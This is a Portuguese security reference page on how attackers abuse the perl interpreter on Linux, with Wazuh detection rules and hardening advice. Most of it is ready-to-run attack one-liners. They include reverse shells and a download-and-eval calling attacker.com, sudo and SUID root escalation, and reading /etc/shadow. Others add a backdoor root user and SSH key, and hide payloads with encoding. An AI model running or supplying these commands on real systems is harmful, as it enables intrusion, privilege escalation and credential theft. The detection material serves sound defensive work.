# perl

**Plataforma:** Linux / macOS / Unix

**Categorias:** Execução de código, Shell reverso, Leitura e escrita de arquivos, Escalada de privilégios (sudo/SUID)

**MITRE ATT&CK:** T1059.006 (Python — analogamente aplicável a Perl), T1548.001 (SUID/SGID), T1105 (Ingress Tool Transfer)

**Referência ofensiva:** https://gtfobins.org/gtfobins/perl/

---

## O que é o perl

O Perl é uma linguagem de programação de propósito geral com forte ênfase em processamento de texto. Foi amplamente adotado como linguagem de administração de sistemas e scripts web nos anos 1990 e 2000, e ainda está presente em grande número de servidores Linux — especialmente em ambientes legados, sistemas com servidores web Apache antigos, ou como dependência de ferramentas como Nikto, LANSweeper e diversas ferramentas de monitoramento.

Ao contrário do Python, que ganhou espaço como substituto, o Perl frequentemente passa despercebido em inventários de software de servidores. Sua presença é muitas vezes esquecida justamente porque não é mais a linguagem principal em uso, mas o binário permanece instalado como dependência.

---

## Por que atacantes usam o perl

O Perl é historicamente associado a shells reversos compactos de uma linha — o chamado "Perl one-liner". Por ser uma linguagem completa com acesso a sockets TCP e chamadas de sistema, permite escrever shells reversos funcionais em uma única linha de comando, o que facilita a execução via injeção de comando em aplicações web vulneráveis, onde o espaço disponível para o payload é limitado.

---

## Técnicas de abuso

### Shell reverso

```bash
# Shell reverso clássico em Perl (one-liner)
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Versão compacta sem quebra de linha
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Versão com /dev/tcp (em sistemas com bash, mais simples)
perl -e 'exec("/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1")'
```

### Execução de comandos arbitrários

```bash
# Via system()
perl -e 'system("/bin/bash")'

# Via exec() (substitui o processo atual)
perl -e 'exec("/bin/bash")'

# Via backticks (executa e captura saída)
perl -e 'print `cat /etc/passwd`'

# Via open() com pipe
perl -e 'open(F, "cat /etc/shadow |"); while(<F>){print}'
```

### Escalada de privilégios via sudo

```bash
# Se sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/bash";'

# Alternativa
sudo perl -e 'system("/bin/bash")'
```

### Abuso de SUID

```bash
# Verificar SUID
find / -name perl -perm -4000 2>/dev/null

# Com SUID, elevar privilégios
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Leitura e escrita de arquivos

```bash
# Ler arquivo
perl -ne 'print' /etc/shadow

# Escrever em arquivo (com permissão adequada ou SUID)
perl -e 'open(F,">>/root/.ssh/authorized_keys"); print F "ssh-rsa AAAA... attacker\n"; close(F);'

# Adicionar usuário root ao /etc/passwd
perl -e 'open(F,">>/etc/passwd"); print F "hacker::0:0::/root:/bin/bash\n"; close(F);'
```

### Download de arquivos

```bash
# Download via LWP::Simple (módulo padrão do Perl)
perl -e 'use LWP::Simple; getstore("http://attacker.com/payload", "/tmp/p");'

# Download e execução
perl -e 'use LWP::Simple; my $code=get("http://attacker.com/payload.pl"); eval($code);'
```

---

## Técnicas de bypass e evasão

### Ofuscação via codificação

```bash
# Payload em base64, decodificado e executado via eval
perl -MMIME::Base64 -e 'eval(decode_base64("c3lzdGVtKCIvYmluL2Jhc2giKTs="))'

# Via chr() para ofuscar strings
perl -e 'system(chr(47).chr(98).chr(105).chr(110).chr(47).chr(98).chr(97).chr(115).chr(104))'
# Equivale a: system("/bin/bash")
```

### Uso de variantes e caminhos alternativos

```bash
# Versões alternativas do Perl
perl5 -e 'system("/bin/bash")'
/usr/bin/perl -e 'system("/bin/bash")'

# Cópia renomeada
cp /usr/bin/perl /tmp/.pl
/tmp/.pl -e 'system("/bin/bash")'
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- perl com `-e` contendo `system()`, `exec()`, `socket` ou `connect` na linha de comando
- perl executado via sudo
- perl com `-e` contendo acesso a socket TCP + redirecionamento de I/O (padrão de shell reverso)
- perl executado por processo filho de servidor web

**Indicadores de média relevância:**

- perl com `-e` executando código em base64 (`decode_base64` + `eval`)
- perl com `getstore` ou `get` de URL externa (download)
- perl escrevendo em arquivos de sistema

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0101-gtfobins_execution.xml -->

<!-- perl com -e contendo socket/connect (padrão de shell reverso) -->
<rule id="100231" level="15">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">^perl[0-9.]*$</field>
  <field name="audit.execve" type="pcre2">socket.*connect|SOCK_STREAM.*inet_aton</field>
  <description>perl com padrão de conexão TCP — possivel shell reverso</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- perl com system() ou exec() executando shell -->
<rule id="100232" level="13">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">^perl[0-9.]*$</field>
  <field name="audit.execve" type="pcre2">(system|exec)\s*\([^)]*(/bin/bash|/bin/sh)</field>
  <description>perl executando shell via system() ou exec()</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- perl executado por conta de serviço web -->
<rule id="100233" level="14">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">^perl[0-9.]*$</field>
  <field name="audit.uid" type="pcre2">^(33|65534|99)$</field>
  <description>perl executado por conta de servico web — possivel RCE via aplicacao web</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Ferramentas de sistema legadas:** muitos sistemas têm scripts Perl para tarefas de administração, monitoramento e relatório. O uso legítimo raramente inclui `socket` + `connect` com IPs externos ou `system()` executando shell interativo.

**Ferramentas de segurança:** Nikto, algumas versões do OpenVAS e outras ferramentas de segurança são escritas em Perl. Filtre pelo usuário de execução dessas ferramentas e pelo contexto de uso.

---

## Proteção e controles defensivos

**Inventariar e remover perl onde não necessário:** em servidores de aplicação modernos que usam Python, Node.js ou Java, o perl raramente é necessário em runtime. Identifique se alguma dependência de sistema requer perl (`dpkg -l | grep perl`) e avalie a remoção dos pacotes desnecessários.

**Auditar sudoers:** `sudo perl` equivale a acesso root imediato. Não há caso de uso legítimo que justifique isso — substitua por scripts wrapper com operações específicas.

---

## Referências

- GTFOBins — perl: https://gtfobins.org/gtfobins/perl/
- MITRE ATT&CK T1059.004: https://attack.mitre.org/techniques/T1059/004/
- MITRE ATT&CK T1548.001: https://attack.mitre.org/techniques/T1548/001/
